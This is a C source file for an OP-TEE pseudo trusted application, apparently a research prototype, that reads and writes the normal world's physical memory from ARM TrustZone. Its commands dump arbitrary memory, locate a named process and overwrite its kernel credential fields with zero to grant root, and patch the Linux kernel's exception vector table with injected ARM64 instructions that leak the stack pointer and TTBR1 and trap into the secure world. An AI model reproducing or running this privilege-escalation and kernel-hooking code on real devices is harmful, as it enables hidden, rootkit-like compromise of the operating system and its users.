#include <kernel/pseudo_ta.h>
#include <util.h>
#include <pta_investee.h>
#include <mm/core_memprot.h>
#include <mm/mobj.h>
#include "investee_util/ptw.h"

uint64_t read_dbgbvr0_el1() {
    uint64_t value;
    asm volatile("mrs %0, dbgbvr0_el1" : "=r" (value));
    return value;
}

uint64_t read_dbgbvr1_el1() {
    uint64_t value;
    asm volatile("mrs %0, dbgbvr1_el1" : "=r" (value));
    return value;
}

static struct mobj *current_mobj = NULL;
static void *current_vaddr = 0;

static uint32_t map_paddr(paddr_t paddr)
{
	paddr_t page = paddr & ~0xfff;

	// free the previous page
	if(current_mobj != NULL)	{
		mobj_put(current_mobj);
	}
	// map 1 page at "page" as shared memory
	// only non-secure memory possible
	current_mobj = mobj_mapped_shm_alloc(&page, 1, 0, 0);
	if (current_mobj == NULL) {
		current_vaddr = 0;
		// prevent double frees
		current_mobj = NULL;
		IMSG("shm_alloc failed...");
		return -1;
	}
	current_vaddr = (void *)mobj_get_va(current_mobj, 0, 1);
	if(current_vaddr == NULL)	{
		current_vaddr = 0;
		// free wrong mobj
		mobj_put(current_mobj);
		// prevent double frees
		current_mobj = NULL;
		IMSG("get_va failed...");
		return -1;
	}

	return 0;
}

// we always write 32 bit
static uint64_t write_pa(paddr_t paddr, uint32_t value)
{
	// map page
	if (map_paddr(paddr) != 0) {
		return 0;
	}
	// write value
	*(uint32_t *)(current_vaddr + (paddr & 0xfff)) = value;
	return 0;
}

static uint64_t read_pa(paddr_t paddr)
{
	// map page
	if (map_paddr(paddr) != 0) {
		return 0;
	}
	// read value
	uint64_t *mem = (uint64_t *)(current_vaddr + (paddr & 0xfff));
	return *mem;
}

static uint64_t read_page_from_nw(paddr_t paddr, void *dst)
{
	// map page
	if (map_paddr(paddr) != 0) {
		return 0;
	}
	// copy memory
	memcpy(dst, current_vaddr, 0x1000);
	return 0;
}


static TEE_Result open_session(uint32_t param_types __unused,
			       TEE_Param params[TEE_NUM_PARAMS] __unused,
			       void **sess_ctx __unused)
{
    IMSG("investee pta open session has been called!");

	return TEE_SUCCESS;
}

static TEE_Result invoke_command(void *sess_ctx __unused, uint32_t cmd_id,
				 uint32_t param_types,
				 TEE_Param params[TEE_NUM_PARAMS])
{
	IMSG("investee pta invoke command has been called!");

	/*	System mapping
		0x40000000 - 0x41ffffff System RAM
		0x42000000 - 0x421fffff reserved	// non-secure shared memory for OPTEE
		0x42200000 - 0x820fffff System RAM  // stack seems to be in here
		0x42210000 - 0x43caffff Kernel code
		0x43cb0000 - 0x4459ffff reserved
		0x445a0000 - 0x44a6ffff Kernel data
	*/

	uint64_t nw_start = 0x40000000;
	uint64_t nw_size = 0x0F000000;

	char page_buf[0x1000];

	switch (cmd_id)
	{
	case PTA_INVESTEE_DUMP_MEM:
		IMSG("investee DUMP_MEM has been called!");
		paddr_t phys_addr = (paddr_t) *(uint64_t *)&params[0].value.a;
		uint64_t size = (uint64_t) *(uint64_t *)&params[1].value.a;

		IMSG("investee DUMP_MEM: Got address 0x%016lx from NW\n", phys_addr);
		IMSG("investee DUMP_MEM Got size 0x%016lx from NW\n", size);

		// try reading from physical address
		for(int i = 0; i < size; i+=0x8)	{
			uint64_t value = read_pa(phys_addr+i);
			IMSG("hex: %016lx, str: %s", value, (char *)&value);
		}
		return TEE_SUCCESS;
		break;
	case PTA_INVESTEE_SEARCH_PROCESS:
		IMSG("investee SEARCH_PROCESS has been called!");
		char comm_name[16];
		memcpy(comm_name, (char *) params[0].memref.buffer, 16);

		IMSG("investee SEARCH_PROCESS: Searching process with comm: %s\n", comm_name);

		// go through non-sec memory pagewise and search for comm field in task struct
		for(uint64_t j = 0; j < nw_size; j += 0x1000)	{
			read_page_from_nw((nw_start+j), page_buf);
		
			for(uint64_t i = 0; i < 0x1000; i += 0x8)	{

				// here we search for the process name
				if(strncmp(&page_buf[i], comm_name, 15) == 0)	{
					IMSG("\ninvestee SEARCH_PROCESS: Found str: %.16s, at addr: %016lx\n", &page_buf[i], (nw_start+j+i));
					// get the va of cred struct
					uint64_t possible_cred_pointer = read_pa((nw_start+j+i-0x10));
					if(possible_cred_pointer > 0xf000000000000000)	{
						// it looks like it is a kernel space addr
						IMSG("investee SEARCH_PROCESS: Possible cred pointer (-0x10) VA: %016lx", possible_cred_pointer);
						uint64_t cred_pa = possible_cred_pointer - 0xfffeffffc0000000;
						IMSG("investee SEARCH_PROCESS: Possible cred pointer (-0x10) PA: %016lx", cred_pa);

						uint32_t possible_uid = (uint32_t) read_pa(cred_pa + 0x4);
          				uint32_t possible_euid = (uint32_t) read_pa(cred_pa + 0x14);
						uint32_t possible_fsuid = (uint32_t) read_pa(cred_pa + 0x1C);

						//IMSG("investee SEARCH_PROCESS: Possible uid: %d", possible_uid);
						//IMSG("investee SEARCH_PROCESS: Possible euid: %d", possible_euid);
						//IMSG("investee SEARCH_PROCESS: Possible fsuid: %d", possible_fsuid);

						if(possible_uid < 2000)	{
							write_pa(cred_pa + 0x14, 0x0);
							IMSG("investee SEARCH_PROCESS: Wrote euid: %d", read_pa(cred_pa + 0x14));

							write_pa(cred_pa + 0x4, 0x0);
							IMSG("investee SEARCH_PROCESS: Wrote uid: %d", read_pa(cred_pa + 0x4));

							write_pa(cred_pa + 0x1C, 0x0);
							IMSG("investee SEARCH_PROCESS: Wrote fsuid: %d", read_pa(cred_pa + 0x1C));	
						}
					}
				}
			}
		}
		return TEE_SUCCESS;
		break;
	case PTA_HOOK_VBAR:
		IMSG("investee HOOK_VBAR has been called!");

		IMSG("investee HOOK_VBAR: Searching for VBAR_EL1 entrypoint...");

		// the best way would be to read VBAR_EL1 sysreg of NW context
		// PTA can not directly do that -> instead we use a heuristic using linear scan

		// https://developer.arm.com/documentation/100933/0100/AArch64-exception-vector-table

		// excerpt of the Linux kernel's EVT running
		/* offset +0x400 entry lower EL using AArch64
		00011440 03 00 00 14     b          LAB_0001144c
        00011444 7e d0 3b d5     mrs        x30,tpidrro_el0
        00011448 7f d0 1b d5     msr        tpidrro_el0,xzr
                             LAB_0001144c                                    XREF[1]:     00011440(j)  
        0001144c ff 43 05 d1     sub        sp,sp,#0x150
        00011450 ff 63 20 8b     add        sp,sp,x0
        00011454 e0 63 20 cb     sub        x0,sp,x0
        00011458 80 00 70 37     tbnz       w0,#0xe,LAB_00011468
        0001145c e0 63 20 cb     sub        x0,sp,x0
        00011460 ff 63 20 cb     sub        sp,sp,x0
        00011464 e6 01 00 14     b          LAB_00011bfc	// search this instr
                             LAB_00011468                                    XREF[1]:     00011458(j)  
        00011468 40 d0 1b d5     msr        tpidr_el0,x0
        0001146c e0 63 20 cb     sub        x0,sp,x0
        00011470 60 d0 1b d5     msr        tpidrro_el0,x0
        00011474 c0 e2 00 f0     adrp       x0,0x1c6c000
        00011478 1f 40 0c 91     add        sp,x0,#0x310
        0001147c 80 d0 38 d5     mrs        x0,tpidr_el1
        00011480 ff 63 20 8b     add        sp,sp,x0
        00011484 40 d0 3b d5     mrs        x0,tpidr_el0
        00011488 e0 63 20 cb     sub        x0,sp,x0
        0001148c 1f cc 74 f2     tst        x0,#-0x1000
        00011490 81 1d 00 54     b.ne       LAB_00011840
        00011494 ff 63 20 cb     sub        sp,sp,x0
        00011498 60 d0 3b d5     mrs        x0,tpidrro_el0
        0001149c d8 01 00 14     b          LAB_00011bfc
		*/

		// our heuristic searches for this instruction
		uint32_t searched_instr = 0x140001e6;
		
		// 0x42210000 - 0x43caffff Kernel code
		uint64_t nw_code_start = 0x42210000;
		uint64_t nw_code_end = 0x43caffff;

		uint32_t hook_location = 0x0;

		for(uint64_t a = 0; a < (nw_code_end - nw_code_start); a += 0x1000)	{

			if((nw_code_start+a) % 0x00100000 == 0x0)	{
				IMSG("investee HOOK_VBAR: Checking at 0x%016lx\n", (nw_code_start+a));
			}

			read_page_from_nw((nw_code_start+a), page_buf);
		
			// one instruction is 4 byte
			for(uint64_t b = 0; b < (0x1000 / 4); b += 0x1)	{

				uint32_t curr_instr = ((uint32_t *)page_buf)[b];
				
				if(curr_instr == searched_instr)	{
					IMSG("investee HOOK_VBAR: Possible VBAR instr found: %08x", curr_instr);
					IMSG("investee HOOK_VBAR: Possible PA instr: %16lx", (nw_code_start+a+(b*4)));
					hook_location = (nw_code_start+a+(b*4));
				}
			}
		}

		// after we found VBAR hooking location

		// useful for filling space
		uint32_t nop_instr = 0xd503201f;

		// we branch to code 0xf offset - that is our hook entry
		uint32_t hook_entry = 0x1400000f;

		// we jump to after the exception vector table entry
		// there we have space for 8 instructions

		// now inject hook payload
		// save registers on stack - we pass parameters in x0, x1, x2, x3 to OPTEE
		uint32_t strx0x1_instr = 0xa90007e0; // stp        x0,x1,[sp]
		uint32_t strx2x3_instr = 0xa9010fe2; // stp        x2,x3,[sp, #0x10]

		// we have x0=0x32000013 when SMCs for OPTEE but those use mobj objects
		// in our setup we do not have registered shared memory, thus no valid cookie id
		// instead we will use OPTEE_SMC_CALL_WITH_ARG (0x32000004) and write our optee_msg struct in memory here
		// look into function "std_smc_entry" in "thread_optee_smc.c" to see checks for x0
		// write into x0
		uint32_t movzx0_instr = 0xd2800080; // MOVZ X0, #0x0004, LSL #0
		uint32_t movkx0_instr = 0xf2a64000; // MOVK X0, #0x3200, LSL #16
		// upper 32 bit of addr
		uint32_t movx1_instr = 0xd2800001; // MOV X1, 0x0
		// lower 32 bit of addr
		uint32_t movx2_inst = 0xd2a84002; // mov x2, 0x42000000

		// leake the SP and TTBR1 register to the Control Software via debug register so we can do manual ptw
		uint32_t movx0sp_instr = 0x910003e0; // mov x0, sp
		uint32_t msr_dbg_x0_instr = 0xd5100080; // msr dbgbvr0_el1, x0
		uint32_t msr_ttbr1_x0_instr = 0xd5382020; // MRS x0, ttbr1_el1
		uint32_t msr_dbg1_x0_instr = 0xd5100180; // msr dbgbvr1_el1, x0
		// TODO: we should also include save and restore of DEBUG registers

		// SMC
		uint32_t smc_instr = 0xd4000003;


		// restore registers from stack - we saved x0, x1, x2, x3
		uint32_t ldpx0x1_instr = 0xa94007e0; // ldp			x0,x1,[sp]
		uint32_t ldpx2x3_instr = 0xa9410fe2; // ldp 		x2,x3,[sp, #0x10]

		// branch between from 1st to 2nd payload - offset 25
		uint32_t branch_to_second_instr = 0x14000019;

		// branch to the original code - that is our hook exit
		// we calculate this by subtracting the offset (0xf) from the searched instruction (to first payload)
		// and then 0x1 for every instruction in the 1st payload (0x8)
		// and then the offset (0x19) to the 2nd payload
		// then 0x7 for instructions of 2nd payload
		uint32_t hook_exit = searched_instr - 0xf - 0x20 - 0x7;

		if(hook_location != 0x0)	{
			IMSG("investee HOOK_VBAR: Read from hook_entry location (%lx) before write: %16lx\n", hook_location, read_pa(hook_location));
			// place hook entry - overwrite branch in vector table entry
			write_pa(hook_location, hook_entry);
			
			// place hook payload
			IMSG("investee HOOK_VBAR: Read from 1st payload location start (%lx) before write: %16lx\n", hook_location+(0xf*4), read_pa(hook_location+(0xf*4)));
			// write 8 instructions - last one must be a branch to next injected code
			write_pa(hook_location+(0xf*4), strx0x1_instr);
			write_pa(hook_location+(0x10*4), strx2x3_instr);
			write_pa(hook_location+(0x11*4), nop_instr);
			write_pa(hook_location+(0x12*4), msr_ttbr1_x0_instr);
			write_pa(hook_location+(0x13*4), msr_dbg1_x0_instr);
			write_pa(hook_location+(0x14*4), movx0sp_instr);
			write_pa(hook_location+(0x15*4), msr_dbg_x0_instr);
			// branch
			write_pa(hook_location+(0x16*4), branch_to_second_instr);
			IMSG("investee HOOK_VBAR: Read from 1st payload location end (%lx) after write: %16lx\n", hook_location+(0x16*4), read_pa(hook_location+(0x16*4)));
		
			IMSG("investee HOOK_VBAR: Read from 2nd payload location start (%lx) before write: %16lx\n", hook_location+((0xf+0x20)*4), read_pa(hook_location+((0xf+0x20)*4)));
			// write 8 instructions - last one must be a branch to next injected code
			write_pa(hook_location+((0xf+0x20)*4), movzx0_instr);
			write_pa(hook_location+((0x10+0x20)*4), movkx0_instr);
			write_pa(hook_location+((0x11+0x20)*4), movx1_instr);
			write_pa(hook_location+((0x12+0x20)*4), movx2_inst);
			write_pa(hook_location+((0x13+0x20)*4), smc_instr);
			write_pa(hook_location+((0x14+0x20)*4), ldpx2x3_instr);
			write_pa(hook_location+((0x15+0x20)*4), ldpx0x1_instr);
			// branch
			write_pa(hook_location+((0x16+0x20)*4), hook_exit);
			IMSG("investee HOOK_VBAR: Read from 2nd payload location end (%lx) after write: %16lx\n", hook_location+((0x16+0x20)*4), read_pa(hook_location+((0x16+0x20)*4)));
		

			// OPTEE will expect an struct optee_msg_arg at the address in x1 + x2
			// the address must be in CORE_MEM_NSEC_SHM region
			// phys addr of NSEC_SHM is 0x42000000 - 0x421fffff

			// we write an optee_msg_arg struct into memory that calls the PTA
			// we assume that a session is already opened
			
			/*
			struct optee_msg_arg {
			uint32_t cmd;						// OPTEE_MSG_CMD_INVOKE_COMMAND = 0x1
			uint32_t func;						// PTA_LOG_SYSCALL = 0x3
			uint32_t session;					// seems to be 0x2 here
			uint32_t cancel_id;
			uint32_t pad;
			uint32_t ret;
			uint32_t ret_origin;
			uint32_t num_params;

			struct optee_msg_param params[];
			};

			struct optee_msg_param {
				uint64_t attr;
				union {
					struct optee_msg_param_tmem tmem;
					struct optee_msg_param_rmem rmem;
					struct optee_msg_param_fmem fmem;
					struct optee_msg_param_value value;
				} u;
			};

			struct optee_msg_param_tmem {
				uint64_t buf_ptr;
				uint64_t size;
				uint64_t shm_ref;
			};


			*/

			write_pa(0x42000000, 0x1);
			write_pa(0x42000004, 0x3);
			write_pa(0x42000008, 0x2);

		}

		return TEE_SUCCESS;
		break;
	case PTA_LOG_SYSCALL:
		IMSG("investee PTA_LOG_SYSCALL has been called!");

		// read from debug registers to get SP and TTBR1

		uint64_t sp_va = read_dbgbvr0_el1();
		uint64_t ttbr1_el1 = read_dbgbvr1_el1() & 0x0000fffffffffffe;
		//IMSG("investee PTA_LOG_SYSCALL: TTBR1_EL1 of kernel: %lx", ttbr1_el1);

		// prepare ptw
		uint64_t pt1_entry = read_pa(ttbr1_el1);
		pt1_entry &= 0xfffffff000;
		uint64_t pt2_entry = read_pa(pt1_entry);
		pt2_entry &= 0xfffffff000;

		// do ptw
		uint64_t sp_pa = investee_nw_virt_to_phys(sp_va, ttbr1_el1);

		IMSG("investee PTA_LOG_SYSCALL: PA of kernel exception stack: %lx", sp_pa);

		IMSG("investee PTA_LOG_SYSCALL: Stack param 1: %08x", read_pa(sp_pa));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 2: %08x", read_pa(sp_pa+0x8));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 3: %08x", read_pa(sp_pa+0x10));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 4: %08x", read_pa(sp_pa+0x18));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 5: %08x", read_pa(sp_pa+0x20));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 6: %08x", read_pa(sp_pa+0x28));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 7: %08x", read_pa(sp_pa+0x30));
		IMSG("investee PTA_LOG_SYSCALL: Stack param 8: %08x", read_pa(sp_pa+0x38));

		// according to ARM doc: https://developer.arm.com/documentation/ka005621/latest/
		// the kernel saves the pointer to the current running task in SP_EL0
		// could be helpful in identifying the caller process

		return TEE_SUCCESS;
		break;
	default:
		break;
	}

	return TEE_ERROR_NOT_IMPLEMENTED;
}

pseudo_ta_register(.uuid = PTA_INVESTEE_UUID, .name = "investee.pta",
		   .flags = PTA_DEFAULT_FLAGS,
		   .open_session_entry_point = open_session,
		   .invoke_command_entry_point = invoke_command);
